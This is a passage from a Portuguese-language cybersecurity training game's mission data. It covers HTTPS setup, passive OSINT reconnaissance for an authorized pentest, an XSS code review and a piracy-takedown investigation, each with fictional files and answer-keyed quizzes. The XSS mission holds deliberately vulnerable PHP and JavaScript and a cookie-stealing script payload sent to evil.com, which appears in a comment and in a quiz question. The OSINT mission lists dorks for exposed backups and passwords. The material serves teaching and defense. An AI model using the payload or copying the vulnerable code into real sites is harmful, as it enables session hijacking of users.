    tipo: "terminal",
    pontos_maximos: 200,
    icone: "🔒",
    contexto: `A startup <strong>EduTech Brasil</strong> acabou de lançar sua plataforma de cursos online.
O site está no ar com IP <code>177.34.56.78</code>, mas ainda <strong>sem domínio configurado
e sem HTTPS</strong> — os dados dos alunos (incluindo pagamentos) trafegam em texto plano.
Sua missão: configurar o DNS corretamente e instalar um certificado SSL válido.`,
    dica: "Leia <code>cat /etc/nginx/sites-available/edutech</code> para ver a configuração atual e <code>cat /home/admin/dns-checklist.txt</code> para o plano de ação.",
    filesystem: {
      "/": ["etc", "var", "home", "usr"],
      "/etc": ["nginx", "letsencrypt", "hosts"],
      "/etc/nginx": ["sites-available", "sites-enabled", "nginx.conf"],
      "/etc/nginx/sites-available": ["edutech", "default"],
      "/etc/letsencrypt": ["live", "renewal"],
      "/home": ["admin"],
      "/home/admin": ["dns-checklist.txt", "ssl-report.txt"],
      "/var": ["log", "www"],
      "/var/log": ["nginx", "letsencrypt.log"],
      "/var/log/nginx": ["access.log", "error.log"]
    },
    files: {
      "/home/admin/dns-checklist.txt": `# EduTech Brasil — Checklist DNS + SSL
# Responsável: Carlos (DevOps)

SERVIDOR: 177.34.56.78 (DigitalOcean — São Paulo)
DOMÍNIO REGISTRADO: edutech.com.br (Registro.br — expira 2026-01-10)
REGISTRADOR: Registro.br

TAREFAS:
[ ] 1. Criar registro DNS tipo A apontando edutech.com.br → 177.34.56.78
[ ] 2. Criar registro DNS tipo A apontando www.edutech.com.br → 177.34.56.78
[ ] 3. Aguardar propagação DNS (TTL: 300s = 5 minutos / pode levar até 48h)
[ ] 4. Verificar propagação: dig edutech.com.br
[ ] 5. Instalar certbot: apt install certbot python3-certbot-nginx
[ ] 6. Emitir certificado: certbot --nginx -d edutech.com.br -d www.edutech.com.br
[ ] 7. Configurar redirect HTTP → HTTPS no nginx
[ ] 8. Habilitar HSTS no nginx
[ ] 9. Testar: curl -I https://edutech.com.br
[X] 10. Renovação automática já configurada pelo certbot (cron 2x/dia)

PROBLEMA ATUAL: site rodando em HTTP puro — dados em texto plano na rede`,
      "/etc/nginx/sites-available/edutech": `# Configuração ATUAL — SEM SSL (insegura)
server {
    listen 80;
    server_name edutech.com.br www.edutech.com.br;
    root /var/www/edutech/public;
    index index.php index.html;

    # PHP-FPM
    location ~ \\.php$ {
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
        include fastcgi_params;
    }

    # PROBLEMA: Sem SSL/TLS — dados dos alunos em texto plano
    # PROBLEMA: Sem HSTS — permite downgrade de HTTPS para HTTP
    # PROBLEMA: Sem redirect de HTTP para HTTPS
}

# CONFIGURAÇÃO CORRETA deve incluir:
# server { listen 80; return 301 https://$host$request_uri; }
# ssl_certificate /etc/letsencrypt/live/edutech.com.br/fullchain.pem;
# ssl_certificate_key /etc/letsencrypt/live/edutech.com.br/privkey.pem;
# add_header Strict-Transport-Security "max-age=31536000" always;`,
      "/home/admin/ssl-report.txt": `# Relatório de Análise SSL — EduTech Brasil
# Ferramenta: SSL Labs (ssllabs.com/ssltest)

RESULTADO: F (Falha)
PROBLEMAS:
- Sem certificado SSL/TLS instalado
- Conexão HTTP pura na porta 80
- Dados de login e pagamento enviados em texto plano
- Sem HSTS (HTTP Strict Transport Security)

IMPACTO:
- Qualquer pessoa na mesma rede pode capturar senhas e cartões
- Navegadores modernos exibem "Não Seguro" — afasta usuários
- Violação da PCI-DSS (obrigatório HTTPS para pagamentos)
- Violação da LGPD (dados pessoais sem proteção adequada)

CERTIFICADO LET'S ENCRYPT:
- Gratuito, renovação automática a cada 90 dias
- Aceito por 99.9% dos navegadores
- Comando: certbot --nginx -d edutech.com.br`,
      "/var/log/nginx/error.log": `2024/01/15 10:23:01 [warn] site rodando sem SSL
2024/01/15 10:45:33 [error] cerbot: domínio ainda não propagado no DNS
2024/01/15 11:00:01 [info] nginx: aguardando configuração SSL`,
      "/var/log/letsencrypt.log": `2024-01-15 11:30:00 INFO Requesting certificate for edutech.com.br
2024-01-15 11:30:05 INFO Performing http-01 challenge
2024-01-15 11:30:10 ERROR Challenge failed: DNS não propagado para 177.34.56.78
2024-01-15 11:30:10 INFO Dica: verifique se registro A do domínio aponta para 177.34.56.78
2024-01-15 11:30:10 INFO Use: dig edutech.com.br +short`
    },
    perguntas: [
      {
        id: 1,
        texto: "Para apontar o domínio edutech.com.br para o IP 177.34.56.78, qual tipo de registro DNS deve ser criado no painel do Registro.br?",
        opcoes: [
          { id: "a", texto: "Registro MX — direciona e-mails para o servidor" },
          { id: "b", texto: "Registro A (Address) — mapeia nome de domínio diretamente para endereço IPv4" },
          { id: "c", texto: "Registro CNAME — cria um alias de um domínio para outro domínio" },
          { id: "d", texto: "Registro NS — define os servidores de nomes autoritativos do domínio" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! Registro A (Address Record) é o mapeamento direto: nome → IPv4. Para IPv6 usa-se AAAA. CNAME seria usado para 'www' apontando para o domínio raiz. MX é exclusivo para e-mail. NS define quem é autoritativo para o domínio.",
        feedback_errado: "O registro correto é o tipo A (Address Record): mapeia diretamente 'edutech.com.br' → '177.34.56.78'. CNAME cria aliases entre domínios (não para IPs). MX é para servidores de e-mail. NS define os nameservers do domínio."
      },
      {
        id: 2,
        texto: "O certbot falhou porque o DNS ainda não propagou. Após confirmar a propagação com 'dig edutech.com.br +short', qual comando emite o certificado SSL gratuito pelo Let's Encrypt via nginx?",
        opcoes: [
          { id: "a", texto: "openssl req -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365" },
          { id: "b", texto: "certbot --nginx -d edutech.com.br -d www.edutech.com.br" },
          { id: "c", texto: "apt install ssl-cert && make-ssl-cert generate-default-snakeoil" },
          { id: "d", texto: "nginx -t && systemctl reload nginx" }
        ],
        correta: "b",
        pontos: 80,
        feedback_correto: "Perfeito! 'certbot --nginx' integra com nginx automaticamente: obtém o certificado da CA Let's Encrypt via ACME protocol, edita a configuração nginx para incluir os caminhos do certificado, e configura a renovação automática. Válido 90 dias, renovação automática 2x/dia via cron.",
        feedback_errado: "openssl gera certificados autoassinados — navegadores mostram erro de segurança. make-ssl-cert também gera autoassinados. O comando correto é 'certbot --nginx': obtém certificado real e gratuito do Let's Encrypt, modifica o nginx automaticamente e configura renovação automática."
      },
      {
        id: 3,
        texto: "Após instalar o SSL, ainda é necessário redirecionar HTTP para HTTPS. Qual diretiva nginx garante que toda conexão HTTP seja redirecionada automaticamente para HTTPS?",
        opcoes: [
          { id: "a", texto: "deny http; allow https; no bloco location /" },
          { id: "b", texto: "server { listen 80; return 301 https://$host$request_uri; } e adicionar add_header Strict-Transport-Security 'max-age=31536000' always;" },
          { id: "c", texto: "proxy_pass https://edutech.com.br no bloco upstream" },
          { id: "d", texto: "ssl_redirect on; no bloco server do nginx" }
        ],
        correta: "b",
        pontos: 70,
        feedback_correto: "Correto! 'return 301 https://...' redireciona permanentemente HTTP→HTTPS (301 = movido permanentemente, favorável para SEO). HSTS (Strict-Transport-Security) instrui o browser a só usar HTTPS por 31536000 segundos (1 ano) — previne ataques de downgrade mesmo sem o redirect.",
        feedback_errado: "A diretiva correta é 'return 301 https://$host$request_uri' em um bloco server ouvindo na porta 80. Isso redireciona qualquer acesso HTTP para HTTPS. HSTS complementa: informa ao browser para nunca tentar HTTP neste domínio, prevenindo ataques SSL strip."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A EduTech Brasil operava sem HTTPS, expondo dados de alunos (senhas, dados de pagamento) em texto plano na rede. Qualquer atacante na mesma rede (ex: Wi-Fi público) poderia capturar essas informações com um simples packet sniffer.",
      vulnerabilidade: "Ausência de TLS/SSL, sem HSTS, sem redirect HTTP→HTTPS. Violação da PCI-DSS (obrigatório para pagamentos) e LGPD (dados pessoais sem criptografia em trânsito).",
      risco: "Interceptação de credenciais e dados de pagamento (man-in-the-middle), confiança dos usuários comprometida (navegador exibe 'Não Seguro'), penalidades regulatórias (LGPD, PCI-DSS), descredenciamento por processadoras de pagamento.",
      como_corrigir: "1. Criar registros DNS tipo A para domínio e www\n2. Aguardar propagação DNS (TTL 300s a 48h)\n3. certbot --nginx -d dominio.com.br (Let's Encrypt, gratuito)\n4. Redirect 301 HTTP→HTTPS no nginx\n5. HSTS com max-age=31536000\n6. Verificar configuração com SSL Labs (ssllabs.com)\n7. Certbot renova automaticamente — verificar cron",
      boa_pratica: "HTTPS não é mais opcional: é exigência do Chrome (marca 'Não Seguro'), do Google (penaliza SEO), da PCI-DSS (pagamentos), da LGPD (proteção de dados pessoais). Let's Encrypt eliminou o custo de certificados SSL. Ferramentas: SSL Labs para auditoria, certbot para automação, HSTS para hardening adicional."
    }
  },

  // ─── MISSÃO 11 ────────────────────────────────────────────────────────────
  {
    id: 11,
    titulo: "OSINT — Reconhecimento Passivo",
    subtitulo: "Coletando inteligência aberta antes de um pentest autorizado",
    dificuldade: "Médio",
    tipo: "terminal",
    pontos_maximos: 150,
    icone: "🔍",
    contexto: `Você foi contratado pela empresa <strong>Varejo Digital S.A.</strong> para realizar um
<strong>pentest completo autorizado</strong>. A fase inicial é o reconhecimento passivo (OSINT) —
coletar o máximo de informações <strong>sem enviar um único pacote ao alvo</strong>.
Analise os resultados das ferramentas de OSINT já executadas pela equipe.`,
    dica: "Leia os arquivos em <code>/home/pentester/osint/</code> para analisar os dados coletados sobre o alvo.",
    filesystem: {
      "/": ["home", "tools", "var"],
      "/home": ["pentester"],
      "/home/pentester": ["osint", "relatorio.txt"],
      "/home/pentester/osint": ["whois.txt", "dns-enum.txt", "shodan.txt", "linkedin.txt", "google-dorks.txt"],
      "/tools": ["theHarvester", "maltego", "recon-ng"],
      "/var": ["log"]
    },
    files: {
      "/home/pentester/relatorio.txt": `# OSINT REPORT — Varejo Digital S.A.
# Analista: Você
# Data: 2024-01-15
# AUTORIZAÇÃO: Contrato #2024-PEN-007 assinado em 2024-01-10

FASES DO PENTEST:
[Em andamento] 1. Reconhecimento Passivo (OSINT) — SEM contato com o alvo
[ ]            2. Reconhecimento Ativo — varredura de rede (requer autorização explícita)
[ ]            3. Enumeração de vulnerabilidades
[ ]            4. Exploração (em ambiente controlado)
[ ]            5. Pós-exploração e relatório

OBJETIVO FASE 1: mapear superfície de ataque sem disparar alertas no alvo`,
      "/home/pentester/osint/whois.txt": `# WHOIS — varejodigital.com.br
# Fonte: whois.registro.br (dados públicos)

Domain: varejodigital.com.br
Owner: Varejo Digital Comercio Eletronico Ltda
CNPJ: 12.345.678/0001-90
Admin Contact: carlos.ti@varejodigital.com.br
Tech Contact: suporte@varejodigital.com.br
Registrar: Registro.br
Name Servers: ns1.cloudflare.com / ns2.cloudflare.com
Created: 2018-03-22
Expires: 2025-03-22
Status: Active

# IP do servidor (antes do Cloudflare): 186.202.153.47
# Datacenter: Localweb — São Paulo, SP
# ASN: AS28573 (Claro/NET Virtua)

DADO SENSÍVEL ENCONTRADO: e-mail direto do responsável de TI exposto no WHOIS`,
      "/home/pentester/osint/dns-enum.txt": `# DNS Enumeration — Subdomínios encontrados
# Ferramenta: subfinder + amass (consultas DNS passivas)

SUBDOMÍNIOS DESCOBERTOS:
varejodigital.com.br          → 104.21.x.x (Cloudflare CDN)
www.varejodigital.com.br      → 104.21.x.x (Cloudflare CDN)
mail.varejodigital.com.br     → 186.202.153.47 (IP real exposto!)
ftp.varejodigital.com.br      → 186.202.153.47 (FTP ainda ativo?)
dev.varejodigital.com.br      → 186.202.153.47 (AMBIENTE DEV PÚBLICO!)
admin.varejodigital.com.br    → 186.202.153.47
vpn.varejodigital.com.br      → 186.202.154.12
old.varejodigital.com.br      → 186.202.153.47 (versão antiga do site)

OBSERVAÇÃO: O subdomínio mail.* e dev.* revelam o IP real do servidor,
bypassing da proteção Cloudflare. Dev exposto é alvo de alta prioridade.`,
      "/home/pentester/osint/shodan.txt": `# Shodan.io — Resultados para IP 186.202.153.47
# Shodan indexa serviços expostos na internet sem contato direto

IP: 186.202.153.47
País: Brazil | Cidade: São Paulo
ISP: Localweb Comunicacao

PORTAS ABERTAS (encontradas pelo Shodan):
22/tcp   SSH OpenSSH 7.4 (Ubuntu 16.04 — END OF LIFE desde abril 2021!)
80/tcp   HTTP nginx/1.14.0
443/tcp  HTTPS nginx/1.14.0
21/tcp   FTP vsftpd 3.0.3 (FTP — protocolo inseguro)
8080/tcp HTTP Apache Tomcat/8.5.5 (versão antiga com CVEs conhecidos)

BANNERS E VERSÕES:
- Ubuntu 16.04 LTS: sem suporte desde abril 2021 — sem patches de segurança
- Tomcat 8.5.5: vulnerável a CVE-2020-1938 (AJP Ghost, score CVSS 9.8)
- nginx/1.14.0: sem patches recentes

NOTA: Shodan coleta esses dados indexando a internet — é 100% passivo e legal`,
      "/home/pentester/osint/linkedin.txt": `# LinkedIn OSINT — Funcionários encontrados
# Ferramenta: theHarvester + busca manual LinkedIn

FUNCIONÁRIOS IDENTIFICADOS (perfis públicos):
- Carlos Mendes — Gerente de TI (carlos.ti@varejodigital.com.br)
- Ana Rodrigues — Desenvolvedora Sênior (stack: PHP, Laravel, MySQL, AWS)
- Roberto Santos — DBA (stack: MySQL 5.7, backup manual)
- Fernanda Lima — Analista de Suporte (telefone comercial exposto)
- João Pedro — Estagiário Dev (publicou screenshot com código no GitHub)

TECNOLOGIAS MAPEADAS (perfis e posts públicos):
- Backend: PHP + Laravel
- DB: MySQL 5.7
- Cloud: AWS (região sa-east-1)
- CI/CD: Jenkins (versão desconhecida)
- Framework mobile: React Native

USO ÉTICO: informações para mapear superfície de ataque, jamais para assédio`,
      "/home/pentester/osint/google-dorks.txt": `# Google Dorks — Resultados (busca em dados PÚBLICOS indexados pelo Google)
# Nenhum pacote enviado ao alvo — apenas consulta ao índice do Google

DORKS EXECUTADOS:
site:varejodigital.com.br filetype:pdf
→ Encontrado: manual_funcionarios_2022.pdf (dados de RH)
→ Encontrado: politica_seguranca_v1.pdf (políticas internas)

site:varejodigital.com.br filetype:sql
→ Encontrado: backup_db_nov2023.sql (CRÍTICO: backup de banco exposto!)

site:varejodigital.com.br inurl:admin
→ Encontrado: /admin/panel — painel administrativo indexado pelo Google

"varejodigital.com.br" password filetype:txt
→ Encontrado: config_old.txt com credenciais de desenvolvimento

NOTA: Google Dorks usa apenas o índice público do Google — não é intrusivo.
Porém revela informações que nunca deveriam ser públicas.`
    },
    perguntas: [
      {
        id: 1,
        texto: "O reconhecimento passivo encontrou dev.varejodigital.com.br exposto publicamente e o IP real do servidor bypassing do Cloudflare. Por que isso é perigoso?",
        opcoes: [
          { id: "a", texto: "Subdomínios de desenvolvimento são sempre seguros pois ninguém os conhece" },
          { id: "b", texto: "Subdomínios dev geralmente têm menos controles de segurança, código não finalizado e o IP real permite ataques diretos ao servidor, bypassando a proteção do Cloudflare" },
          { id: "c", texto: "É apenas uma questão de organização de URL — não representa risco" },
          { id: "d", texto: "O Cloudflare protege automaticamente todos os subdomínios" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! Ambientes de desenvolvimento tendem a ter debug ativado, autenticação relaxada, sem WAF, e código ainda não revisado para segurança. Ao expor o IP real, um atacante pode atacar diretamente o servidor, bypassing de CDN/WAF do Cloudflare — proteção inútil se o IP real é conhecido.",
        feedback_errado: "'Security through obscurity' não funciona — subdomínios são descobertos facilmente com ferramentas de DNS passivo. Ambientes dev raramente têm os mesmos controles de produção. O IP real exposto pelos subdomínios mail e dev permite atacar o servidor diretamente, contornando toda proteção do Cloudflare."
      },
      {
        id: 2,
        texto: "O Shodan encontrou Ubuntu 16.04 (sem suporte desde 2021) e Tomcat 8.5.5 com CVE-2020-1938 (CVSS 9.8). O Shodan realizou uma varredura no servidor da empresa?",
        opcoes: [
          { id: "a", texto: "Sim — o Shodan atacou ativamente o servidor para obter essas informações" },
          { id: "b", texto: "Não — o Shodan é um motor de busca que indexa serviços da internet continuamente; consultar o Shodan é totalmente passivo — equivale a pesquisar no Google" },
          { id: "c", texto: "Sim — o Shodan enviou pacotes TCP para descobrir as versões dos serviços" },
          { id: "d", texto: "Não importa — usar o Shodan em qualquer contexto é ilegal" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Exato! Shodan é um motor de busca: rastreia a internet continuamente e indexa banners de serviços. Consultar o Shodan é equivalente a pesquisar no Google — você acessa dados já coletados, sem nenhum contato com o alvo. Isso é reconhecimento 100% passivo e legal.",
        feedback_errado: "Shodan funciona como Google para dispositivos conectados: rastreia toda a internet e indexa os resultados. Quando você consulta o Shodan, acessa um banco de dados já existente — zero pacotes enviados ao alvo. É passivo e legal. O que pode ser ilegal é explorar as vulnerabilidades encontradas sem autorização."
      },
      {
        id: 3,
        texto: "O Google Dork encontrou 'backup_db_nov2023.sql' — um backup do banco de dados acessível publicamente. Qual é a ação correta ao descobrir isso durante um pentest autorizado?",
        opcoes: [
          { id: "a", texto: "Baixar o banco e analisar todos os dados para reportar o máximo de vulnerabilidades" },
          { id: "b", texto: "Documentar a descoberta no relatório, notificar o cliente imediatamente para que removam o arquivo, e NÃO acessar o conteúdo — o escopo do pentest não inclui exfiltração de dados" },
          { id: "c", texto: "Ignorar — arquivos SQL expostos são comuns e não representam risco" },
          { id: "d", texto: "Publicar a descoberta nas redes sociais para pressionar a empresa a corrigir" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Excelente ética profissional! Um pentest ético tem escopo definido em contrato. Acessar dados fora do escopo (mesmo que tecnicamente possível) viola o contrato e pode violar a LGPD. A notificação imediata protege a empresa. Documentar sem explorar é a conduta correta — o objetivo é identificar o problema, não explorá-lo.",
        feedback_errado: "Baixar dados de produção excede o escopo do pentest e pode violar a LGPD mesmo com autorização de pentest. A conduta ética é: documentar a URL de acesso como prova da exposição, notificar o cliente imediatamente para mitigação, e aguardar instrução para continuar. O pentest documenta vulnerabilidades — não exfiltra dados reais."
      }
    ],
    conclusao: {
      o_que_aconteceu: "A fase de OSINT revelou uma superfície de ataque ampla: IP real exposto via subdomínios, servidor desatualizado com vulnerabilidades críticas indexadas pelo Shodan, backup de banco exposto publicamente via Google Dork, e stack tecnológica completa mapeada pelo LinkedIn — tudo sem enviar um único pacote ao alvo.",
      vulnerabilidade: "Gestão inadequada de subdomínios, servidor sem patches críticos (Ubuntu EOL, Tomcat vulnerável), exposição acidental de backups em servidor web público, informações excessivas em perfis públicos.",
      risco: "Reconhecimento passivo completo facilita ataques posteriores: IP real conhecido bypassa proteção CDN, versões desatualizadas com CVEs públicos, credenciais em arquivos expostos, engenharia social facilitada pelos dados de funcionários.",
      como_corrigir: "1. Auditar subdomínios — remover ou proteger os não necessários\n2. Configurar Cloudflare para todos os subdomínios, incluindo mail e dev\n3. Atualizar Ubuntu e Tomcat imediatamente\n4. Remover backups do servidor web — usar storage privado (S3 privado, backup dedicado)\n5. Política de informações em perfis LinkedIn — não expor stack técnica\n6. Monitorar Google Dorks periodicamente (Google Alerts, dorkbot)",
      boa_pratica: "OSINT é a primeira fase de qualquer pentest profissional. Ferramentas: Shodan, Censys, theHarvester, Maltego, Recon-ng, Amass. A fase passiva não dispara nenhum alerta no alvo — permite mapear toda a superfície antes de qualquer ação. Regra de ouro: quanto mais informação coletada passivamente, mais cirúrgico é o pentest."
    }
  },

  // ─── MISSÃO 12 ────────────────────────────────────────────────────────────
  {
    id: 12,
    titulo: "XSS — Cross-Site Scripting",
    subtitulo: "Identificando e corrigindo injeção de scripts em aplicação web",
    dificuldade: "Médio",
    tipo: "browser",
    pontos_maximos: 150,
    icone: "💉",
    contexto: `Você foi contratado pela <strong>ForumTech</strong> para auditar a segurança de seu
fórum de discussão. Suspeita-se de vulnerabilidades de XSS que permitem que atacantes
<strong>injetem JavaScript malicioso</strong> nas páginas vistas por outros usuários.
Analise o código-fonte do fórum e identifique os problemas.`,
    dica: "Examine o código PHP do fórum em busca de locais onde dados do usuário são exibidos sem sanitização.",
    codigo_fonte: {
      "forum.php": `<?php
// forum.php — ForumTech Sistema de Discussão
// AUDITORIA DE SEGURANÇA — Code Review

// Exibição de mensagens do fórum
$posts = $db->query("SELECT * FROM posts ORDER BY criado_em DESC");
while ($post = $posts->fetch_assoc()) {
    // VULNERABILIDADE: conteúdo do post exibido diretamente sem sanitização
    echo '<div class="post">';
    echo '<h3>' . $post['titulo'] . '</h3>';           // XSS STORED: linha 9
    echo '<p>' . $post['conteudo'] . '</p>';           // XSS STORED: linha 10
    echo '<span>Por: ' . $post['autor'] . '</span>';   // XSS STORED: linha 11
    echo '</div>';
}

// Busca de posts
$busca = $_GET['q'];
echo "Resultados para: " . $busca;  // XSS REFLECTED: linha 17

// COMO DEVERIA SER:
// echo htmlspecialchars($post['titulo'], ENT_QUOTES, 'UTF-8');
// echo htmlspecialchars($busca, ENT_QUOTES, 'UTF-8');

// EXEMPLO DE PAYLOAD MALICIOSO QUE FUNCIONARIA:
// Título do post: <script>document.location='https://evil.com/?c='+document.cookie</script>
// Quando exibido: executa JavaScript, rouba cookies de todos os visitantes
?>`,
      "header.php": `<?php
// header.php — Cabeçalhos HTTP de segurança
header("Content-Type: text/html; charset=UTF-8");
// AUSENTE: Content-Security-Policy
// AUSENTE: X-XSS-Protection
// AUSENTE: X-Content-Type-Options

// Content-Security-Policy correto seria:
// header("Content-Security-Policy: default-src 'self'; script-src 'self'");
// Isso bloquearia scripts de origens externas, mitigando XSS mesmo que ocorra injeção
?>`,
      "comentarios.php": `<?php
// comentarios.php — Sistema de comentários
// DOM-based XSS via JavaScript

// JavaScript inseguro (DOM XSS)
?>
<script>
// Pega parâmetro da URL e injeta no DOM sem sanitização
var nome = location.hash.substring(1);            // #<script>alert(1)</script>
document.getElementById('saudacao').innerHTML = 'Olá, ' + nome;  // DOM XSS linha 10

// SEGURO seria:
// document.getElementById('saudacao').textContent = 'Olá, ' + nome;
// ou sanitizar com DOMPurify: DOMPurify.sanitize(nome)
</script>
<div id="saudacao"></div>`
    },
    perguntas: [
      {
        id: 1,
        texto: "Em forum.php linha 9-11, os dados do banco são exibidos sem htmlspecialchars(). Um atacante criou um post com título '<script>document.location=\\'https://evil.com/?c=\\'+document.cookie</script>'. Qual tipo de XSS é esse e qual é seu impacto?",
        opcoes: [
          { id: "a", texto: "XSS Refletido — afeta apenas quem clica no link malicioso" },
          { id: "b", texto: "XSS Armazenado (Stored/Persistent) — o script fica salvo no banco e executa para TODOS os usuários que visitarem o fórum, roubando os cookies de sessão de todos" },
          { id: "c", texto: "XSS baseado em DOM — manipula apenas o DOM local sem servidor" },
          { id: "d", texto: "SQL Injection disfarçado de XSS" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! XSS Armazenado é o mais perigoso: o payload é salvo no banco de dados e executa para CADA usuário que visitar a página — sem precisar de interação específica. Roubar document.cookie permite sequestro de sessão (session hijacking): o atacante usa o cookie roubado para acessar a conta da vítima.",
        feedback_errado: "XSS Armazenado (Stored XSS) é diferente do Refletido: o script malicioso fica persistente no banco de dados e executa para todos os visitantes automaticamente. XSS Refletido requer que a vítima clique em um link específico. O roubo de document.cookie permite hijack de sessão de todos os usuários do fórum."
      },
      {
        id: 2,
        texto: "A correção para Stored XSS em PHP é qual função aplicada antes de exibir dados do usuário?",
        opcoes: [
          { id: "a", texto: "strip_tags($dados) — remove todas as tags HTML" },
          { id: "b", texto: "htmlspecialchars($dados, ENT_QUOTES, 'UTF-8') — converte caracteres especiais em entidades HTML, tornando scripts inofensivos" },
          { id: "c", texto: "addslashes($dados) — escapa aspas" },
          { id: "d", texto: "md5($dados) — faz hash dos dados antes de exibir" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Perfeito! htmlspecialchars() converte: < em &lt;, > em &gt;, \" em &quot;, ' em &#039;. Isso torna <script>alert(1)</script> em &lt;script&gt;alert(1)&lt;/script&gt; — exibido como texto, nunca executado como JavaScript. ENT_QUOTES escapa tanto aspas simples quanto duplas.",
        feedback_errado: "strip_tags remove tags mas pode falhar em casos complexos. addslashes protege contra SQL injection mas não XSS. A função correta é htmlspecialchars($dados, ENT_QUOTES, 'UTF-8'): converte caracteres especiais em entidades HTML seguras, tornando qualquer injeção de script inofensiva."
      },
      {
        id: 3,
        texto: "header.php não define Content-Security-Policy (CSP). Qual seria o benefício de adicionar o header 'Content-Security-Policy: default-src \\'self\\'; script-src \\'self\\''?",
        opcoes: [
          { id: "a", texto: "Nenhum — CSP apenas afeta SEO do site" },
          { id: "b", texto: "CSP é uma linha de defesa adicional: mesmo que ocorra XSS, o browser bloqueia scripts de origens não autorizadas, impedindo que scripts injetados carreguem recursos externos ou executem código inline" },
          { id: "c", texto: "CSP substitui completamente a necessidade de htmlspecialchars()" },
          { id: "d", texto: "CSP apenas funciona no servidor, não no navegador do usuário" }
        ],
        correta: "b",
        pontos: 50,
        feedback_correto: "Correto! CSP é defesa em profundidade: mesmo que um XSS ocorra (bug de desenvolvedor), o browser moderno bloqueia a execução de scripts não autorizados pelo CSP. 'script-src \\'self\\'' só permite scripts do próprio domínio — bloqueia scripts inline e externos, o que elimina a maior classe de ataques XSS.",
        feedback_errado: "CSP (Content-Security-Policy) é implementado via HTTP header e respeitado pelo browser. É uma segunda linha de defesa: mesmo que exista XSS no código, o browser bloqueia a execução de scripts externos ou inline não autorizados. Não substitui htmlspecialchars(), mas complementa — defense in depth."
      }
    ],
    conclusao: {
      o_que_aconteceu: "O fórum da ForumTech tinha três tipos de XSS: Stored XSS (dados do banco sem sanitização), Reflected XSS (parâmetro GET exibido diretamente), e DOM-based XSS (innerHTML com dados não confiáveis). Um atacante poderia roubar cookies de sessão de todos os usuários, redirecionar para phishing, ou instalar keyloggers via JavaScript.",
      vulnerabilidade: "OWASP Top 10: A03 - Injection (XSS é uma forma de injeção). Ausência de output encoding (htmlspecialchars), sem Content-Security-Policy, uso de innerHTML ao invés de textContent.",
      risco: "Session hijacking de todos os usuários, defacement do site, phishing de credenciais, instalação de malware via JavaScript malicioso, comprometimento de qualquer usuário que visite o fórum.",
      como_corrigir: "1. htmlspecialchars($dado, ENT_QUOTES, 'UTF-8') em TODOS os outputs de dados do usuário\n2. Content-Security-Policy header restritivo\n3. Substituir innerHTML por textContent em JavaScript\n4. DOMPurify para sanitização de HTML rico (se precisar de formatação)\n5. HttpOnly e Secure flags nos cookies (previne acesso via JavaScript mesmo em XSS)\n6. WAF com regras XSS",
      boa_pratica: "Regra de ouro: nunca confie em dados do usuário. Aplique output encoding contextual: htmlspecialchars para HTML, addslashes para JavaScript, PDO/prepared statements para SQL. CSP é a rede de segurança: mesmo que ocorra XSS, mitiga o impacto. Use ferramentas SAST (análise estática) como Psalm ou PHPStan para detectar XSS automaticamente."
    }
  },

  // ─── MISSÃO 13 ────────────────────────────────────────────────────────────
  {
    id: 13,
    titulo: "Operação Interpol — Takedown de Pirataria",
    subtitulo: "Inteligência cibernética para desativação de servidor ilegal",
    dificuldade: "Difícil",
    tipo: "terminal",
    pontos_maximos: 250,
    icone: "🌐",
    contexto: `Você integra a unidade de <strong>Crimes Cibernéticos da Interpol</strong> (IC3).
Recebeu uma denúncia anônima sobre um servidor de distribuição ilegal de filmes,
séries e software pirata que prejudica empresas brasileiras.
Sua missão: <strong>coletar evidências digitais, identificar o responsável pelo servidor
e acionar o processo legal de takedown</strong> junto à hospedagem.`,
    dica: "Comece por <code>cat /case/ic3-2024-0147/briefing.txt</code> e analise os logs e dados WHOIS em <code>/case/ic3-2024-0147/evidencias/</code>.",
    filesystem: {
      "/": ["case", "tools", "var"],
      "/case": ["ic3-2024-0147"],
      "/case/ic3-2024-0147": ["briefing.txt", "evidencias", "procedimentos.txt"],
      "/case/ic3-2024-0147/evidencias": ["whois-ip.txt", "dns-records.txt", "http-headers.txt", "hash-evidencias.txt", "abuse-contact.txt"],
      "/tools": ["whois", "dig", "curl", "hashcheck"],
      "/var": ["log"]
    },
    files: {
      "/case/ic3-2024-0147/briefing.txt": `# INTERPOL — IC3 (Internet Crime Complaint Center)
# CASO: IC3-2024-0147
# CLASSIFICAÇÃO: CONFIDENCIAL
# DATA: 2024-01-15
# ANALISTA RESPONSÁVEL: Você

RESUMO DO CASO:
O site "pirateflix.to" distribui ilegalmente conteúdo protegido por direitos autorais.
Denúncias de: Sony Pictures, Netflix Brasil, Adobe Systems.

CONTEÚDO ILEGAL IDENTIFICADO:
- 2.847 filmes em HD sem licença
- 1.234 episódios de séries
- 456 softwares proprietários (Adobe, Microsoft, Autodesk)
- Receita estimada via anúncios: R$ 45.000/mês

OBJETIVO DA INVESTIGAÇÃO:
1. Identificar quem hospeda o servidor (hosting provider)
2. Localizar o contato de abuso (abuse contact)
3. Preservar evidências com integridade forense
4. Emitir notificação legal de takedown ao provedor
5. Encaminhar para delegacia de crimes digitais local

ATENÇÃO: NÃO realizar ataques ao servidor. Procedimento é 100% LEGAL.`,
      "/case/ic3-2024-0147/evidencias/whois-ip.txt": `# WHOIS — IP 185.220.101.88
# Fonte: whois.arin.net / whois.ripe.net
# Data da consulta: 2024-01-15 09:00:00 UTC

inetnum: 185.220.101.0 - 185.220.101.255
netname: PRIVEX-NET
descr: Privex Inc — Offshore Hosting Provider
country: SE (Suécia)
admin-c: PRIV-RIPE
tech-c: PRIV-RIPE
abuse-mailbox: abuse@privex.io
status: ASSIGNED PA

# DADOS DO REGISTRANTE DO DOMÍNIO (pirateflix.to):
Registrant: Privacy Protected (domínio com proteção de privacidade WHOIS)
Registrar: Namecheap (1528890 Monroe Dr NE, Atlanta, GA)
Registrar Abuse Contact: abuse@namecheap.com
Registrar Abuse Phone: +1.6613102107
Created: 2023-08-14
Expires: 2025-08-14

NOTA INVESTIGATIVA: Domínio usa proteção de privacidade WHOIS (legal na maioria dos países)
Próximo passo: ofício judicial ao registrador para revelar dados reais do registrante`,
